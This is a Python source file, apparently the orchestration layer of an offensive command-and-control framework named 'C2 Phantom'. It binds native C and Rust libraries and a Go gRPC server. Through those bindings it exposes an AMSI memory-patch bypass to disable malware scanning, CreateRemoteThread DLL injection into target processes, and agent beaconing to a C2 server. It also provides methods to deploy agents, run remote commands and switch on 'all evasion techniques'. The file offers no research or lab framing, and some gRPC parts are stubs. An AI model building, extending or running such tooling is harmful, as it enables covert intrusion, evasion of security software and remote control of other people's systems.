"""
C2 Phantom - Python Orchestration Layer
Binds C core (ctypes), Rust agent (FFI), and Go server (gRPC) into unified command interface.
"""

import ctypes
import os
import sys
from pathlib import Path
from typing import Optional, Dict, Any, List
import logging
import asyncio
import warnings

logger = logging.getLogger(__name__)


class CCoreBridge:
    """FFI bridge to C core libraries (crypto, network, evasion)."""

    def __init__(self, lib_path: Optional[Path] = None):
        """Initialize C core library binding."""
        if lib_path is None:
            lib_path = Path(__file__).parent.parent / "build" / "libc2core.so"
            if sys.platform == "win32":
                lib_path = lib_path.with_suffix(".dll")
            elif sys.platform == "darwin":
                lib_path = lib_path.with_suffix(".dylib")

        if not lib_path.exists():
            raise RuntimeError(f"C core library not found: {lib_path}. Run 'make c-core' first.")

        self.lib = ctypes.CDLL(str(lib_path))
        self._setup_function_signatures()
        logger.info(f"Loaded C core library: {lib_path}")

    def _setup_function_signatures(self):
        """Define C function signatures for type safety."""
        # AES-GCM functions
        self.lib.aes_has_hardware_acceleration.argtypes = []
        self.lib.aes_has_hardware_acceleration.restype = ctypes.c_int

        self.lib.aes_generate_key_iv.argtypes = [ctypes.POINTER(ctypes.c_uint8), ctypes.POINTER(ctypes.c_uint8)]
        self.lib.aes_generate_key_iv.restype = ctypes.c_int

        # AMSI bypass
        self.lib.amsi_bypass_memory_patch.argtypes = []
        self.lib.amsi_bypass_memory_patch.restype = ctypes.c_int

        self.lib.amsi_is_present.argtypes = []
        self.lib.amsi_is_present.restype = ctypes.c_int

        # Beacon functions
        self.lib.beacon_init.argtypes = [ctypes.c_char_p, ctypes.c_uint16, ctypes.c_char_p]
        self.lib.beacon_init.restype = ctypes.c_void_p

        self.lib.beacon_send.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint8), ctypes.c_size_t]
        self.lib.beacon_send.restype = ctypes.c_int

        # Process injection
        self.lib.inject_dll_remote_thread.argtypes = [ctypes.c_uint32, ctypes.c_char_p]
        self.lib.inject_dll_remote_thread.restype = ctypes.c_int

    def check_aes_hardware(self) -> bool:
        """Check if CPU supports AES-NI hardware acceleration."""
        return bool(self.lib.aes_has_hardware_acceleration())

    def generate_crypto_keys(self) -> tuple[bytes, bytes]:
        """Generate AES-256 key and GCM IV using secure random."""
        key = (ctypes.c_uint8 * 32)()
        iv = (ctypes.c_uint8 * 12)()

        result = self.lib.aes_generate_key_iv(key, iv)
        if result != 0:
            raise RuntimeError("Failed to generate crypto keys")

        return bytes(key), bytes(iv)

    def bypass_amsi(self) -> bool:
        """Patch AMSI in memory to disable scanning."""
        if sys.platform != "win32":
            logger.warning("AMSI bypass only available on Windows")
            return False

        if not self.lib.amsi_is_present():
            logger.info("AMSI not present on system")
            return True

        result = self.lib.amsi_bypass_memory_patch()
        if result == 0:
            logger.info("✓ AMSI successfully bypassed")
            return True
        else:
            logger.error("✗ AMSI bypass failed")
            return False

    def inject_into_process(self, pid: int, dll_path: str) -> bool:
        """Inject DLL into target process using CreateRemoteThread."""
        if sys.platform != "win32":
            logger.error("Process injection only available on Windows")
            return False

        result = self.lib.inject_dll_remote_thread(pid, dll_path.encode())
        return result == 0


class RustAgentBridge:
    """FFI bridge to Rust agent library."""

    def __init__(self, lib_path: Optional[Path] = None):
        """Initialize Rust agent library binding."""
        if lib_path is None:
            lib_path = Path(__file__).parent.parent / "target" / "release" / "libc2_agent.so"
            if sys.platform == "win32":
                lib_path = lib_path.with_suffix(".dll")
            elif sys.platform == "darwin":
                lib_path = lib_path.with_suffix(".dylib")

        if not lib_path.exists():
            raise RuntimeError(
                f"Rust agent library not found: {lib_path}. Run 'cargo build --release' in agent/ first."
            )

        self.lib = ctypes.CDLL(str(lib_path))
        self._setup_function_signatures()
        logger.info(f"Loaded Rust agent library: {lib_path}")

    def _setup_function_signatures(self):
        """Define Rust FFI function signatures."""
        # Agent control
        self.lib.agent_new.argtypes = [ctypes.c_char_p, ctypes.c_uint16]
        self.lib.agent_new.restype = ctypes.c_void_p

        self.lib.agent_connect.argtypes = [ctypes.c_void_p]
        self.lib.agent_connect.restype = ctypes.c_int

        self.lib.agent_beacon.argtypes = [ctypes.c_void_p]
        self.lib.agent_beacon.restype = ctypes.c_int

        self.lib.agent_destroy.argtypes = [ctypes.c_void_p]
        self.lib.agent_destroy.restype = None

    def create_agent(self, server: str, port: int) -> int:
        """Create new agent instance."""
        handle = self.lib.agent_new(server.encode(), port)
        return handle

    def connect_agent(self, handle: int) -> bool:
        """Connect agent to C2 server."""
        result = self.lib.agent_connect(handle)
        return result == 0

    def send_beacon(self, handle: int) -> bool:
        """Send beacon from agent."""
        result = self.lib.agent_beacon(handle)
        return result == 0


class GoServerClient:
    """gRPC client for Go C2 server."""

    def __init__(self, address: str = "localhost:9090"):
        """Initialize gRPC client to Go server."""
        self.address = address
        try:
            import grpc
            try:
                from c2_phantom.proto import c2_pb2, c2_pb2_grpc
                self.channel = grpc.insecure_channel(address)
                self.stub = c2_pb2_grpc.C2ServerStub(self.channel)
                logger.info(f"Connected to Go server: {address}")
            except ImportError:
                warnings.warn("Protobuf files not generated. Run: python -m grpc_tools.protoc...")
                self.channel = None
                self.stub = None
        except ImportError:
            warnings.warn("gRPC not installed. Install with: pip install grpcio grpcio-tools")
            self.channel = None
            self.stub = None

    def register_agent(self, hostname: str, username: str, os_type: str, arch: str, metadata: Dict[str, str]) -> Optional[str]:
        """Register new agent with Go server."""
        if self.stub is None:
            raise RuntimeError("gRPC not available")
        # Implementation would use protobuf messages
        return None

    def send_command(self, agent_id: str, command: str) -> Optional[str]:
        """Send command to agent through Go server."""
        if self.stub is None:
            raise RuntimeError("gRPC not available")
        # Implementation would use protobuf messages
        return None

    def get_agent_results(self, agent_id: str) -> List[Dict[str, Any]]:
        """Retrieve command results from agent."""
        if self.stub is None:
            raise RuntimeError("gRPC not available")
        # Implementation would use protobuf messages
        return []


class C2Orchestrator:
    """
    Main orchestration class that coordinates C core, Rust agent, and Go server.
    This is the Python "brain" that ties everything together.
    """

    def __init__(self):
        """Initialize all components."""
        self.c_core: Optional[CCoreBridge] = None
        self.rust_agent: Optional[RustAgentBridge] = None
        self.go_server: Optional[GoServerClient] = None
        self._initialized = False

    async def initialize(
        self,
        c_lib_path: Optional[Path] = None,
        rust_lib_path: Optional[Path] = None,
        server_url: str = "localhost:50051",
    ):
        """Initialize all framework components."""
        logger.info("Initializing C2 Phantom orchestrator...")

        # Load C core
        try:
            self.c_core = CCoreBridge(c_lib_path)
            logger.info("✓ C core loaded")
        except Exception as e:
            logger.error(f"✗ Failed to load C core: {e}")
            raise

        # Load Rust agent
        try:
            self.rust_agent = RustAgentBridge(rust_lib_path)
            logger.info("✓ Rust agent loaded")
        except Exception as e:
            logger.error(f"✗ Failed to load Rust agent: {e}")
            raise

        # Connect to Go server
        try:
            self.go_server = GoServerClient(server_url)
            logger.info("✓ Go server connected")
        except Exception as e:
            logger.error(f"✗ Failed to connect to Go server: {e}")
            raise

        self._initialized = True
        logger.info("✓ C2 Phantom fully initialized")

        # Run system checks
        await self._run_system_checks()

    async def _run_system_checks(self):
        """Run system capability checks."""
        logger.info("Running system checks...")

        # Check AES-NI
        if self.c_core.check_aes_hardware():
            logger.info("  ✓ AES-NI hardware acceleration available")
        else:
            logger.warning("  ✗ AES-NI not available, using software crypto")

        # Check AMSI (Windows only)
        if sys.platform == "win32":
            amsi_present = self.c_core.lib.amsi_is_present()
            if amsi_present:
                logger.info("  ⚠ AMSI detected - bypass available")
            else:
                logger.info("  ✓ AMSI not present")

    async def deploy_agent(self, target: str, port: int = 443) -> str:
        """Deploy agent to target system."""
        if not self._initialized:
            raise RuntimeError("Orchestrator not initialized")

        logger.info(f"Deploying agent to {target}:{port}")

        # Create agent instance
        agent_handle = self.rust_agent.create_agent(target, port)

        # Connect to C2
        if self.rust_agent.connect_agent(agent_handle):
            logger.info("✓ Agent connected")

            # Register with Go server
            agent_id = f"agent_{os.urandom(8).hex()}"
            # await self.go_server.register_agent(agent_id, {"target": target})

            return agent_id
        else:
            logger.error("✗ Agent connection failed")
            raise RuntimeError("Agent deployment failed")

    async def execute_command(self, agent_id: str, command: str) -> str:
        """Execute command on remote agent."""
        if not self._initialized:
            raise RuntimeError("Orchestrator not initialized")

        logger.info(f"Executing on {agent_id}: {command}")

        # Send through Go server
        # result = await self.go_server.send_command(agent_id, command)

        # return result
        return "Command sent (protobuf implementation pending)"

    def generate_session_keys(self) -> tuple[bytes, bytes]:
        """Generate encryption keys for new session."""
        return self.c_core.generate_crypto_keys()

    def enable_evasion(self) -> bool:
        """Enable all evasion techniques."""
        logger.info("Enabling evasion techniques...")

        success = True

        # AMSI bypass (Windows)
        if sys.platform == "win32":
            if not self.c_core.bypass_amsi():
                success = False

        # ETW bypass would go here
        # Anti-debug would go here

        return success


# Global orchestrator instance
_orchestrator: Optional[C2Orchestrator] = None


async def get_orchestrator() -> C2Orchestrator:
    """Get global orchestrator instance (singleton)."""
    global _orchestrator
    if _orchestrator is None:
        _orchestrator = C2Orchestrator()
        await _orchestrator.initialize()
    return _orchestrator
